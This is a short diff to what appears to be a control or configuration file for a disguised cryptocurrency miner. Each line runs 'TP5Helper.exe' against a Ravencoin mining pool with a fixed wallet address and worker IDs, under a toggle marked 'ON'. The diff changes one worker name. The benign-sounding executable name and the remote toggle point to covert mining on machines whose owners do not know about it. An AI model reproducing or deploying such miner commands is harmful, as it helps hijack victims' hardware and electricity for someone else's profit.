@@ -14,7 +14,7 @@ A3A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RUgN
 A4A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RUgN4GpvPCG9QUf453wm3PmBbWmjqLFxVa.1013@pplns -i 13 -p x--A4A
 A5A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RUgN4GpvPCG9QUf453wm3PmBbWmjqLFxVa.1014@pplns -i 14 -p x--A5A
 A6A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RUgN4GpvPCG9QUf453wm3PmBbWmjqLFxVa.1015@pplns -i 15 -p x--A6A
-A7A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RUgN4GpvPCG9QUf453wm3PmBbWmjqLFxVa.cf12@pplns -i 13 -p x--A7A
+A7A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RUgN4GpvPCG9QUf453wm3PmBbWmjqLFxVa.cf13@pplns -i 13 -p x--A7A
 A9A--ON--A9A
 ------------------------------------------------------------------------------------------------------------------------------------
 A0A--\TP5Helper.exe--A0A
